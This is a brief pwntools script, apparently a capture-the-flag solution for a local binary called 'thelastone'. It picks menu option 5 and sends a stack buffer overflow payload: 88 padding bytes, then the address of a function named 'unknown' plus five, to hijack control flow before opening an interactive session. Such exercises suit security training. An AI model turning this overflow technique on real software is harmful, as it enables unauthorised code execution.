from pwn import *

exe = ELF('./thelastone', checksec=False)

p = process(exe.path)
input()
p.sendlineafter(b'> ',b'5')


payload = b'A'*88
payload += p64(exe.sym['unknown']+5)

p.sendlineafter(b'> ',payload)

p.interactive()
